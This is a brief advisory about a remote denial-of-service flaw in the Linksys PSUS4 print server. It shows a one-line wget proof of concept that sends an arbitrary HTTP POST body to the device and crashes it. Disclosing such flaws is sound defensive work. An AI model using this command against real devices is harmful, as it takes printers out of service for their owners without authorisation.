Linksys PSUS4 PrintServer is reported prone to a remote denial of service vulnerability while handling certain HTTP POST requests received on TCP port 80.

An attacker may exploit this condition to deny service to the affected PrintServer.

$ wget --post-data="Br1Ce2N1c3" http://192.168.1.2/
--23:10:05-- http://192.168.1.2/
=> `index.html'
Connecting to 192.168.1.2:80... connected.
HTTP request sent, awaiting response...

=> And the PSUS4 is crashed.
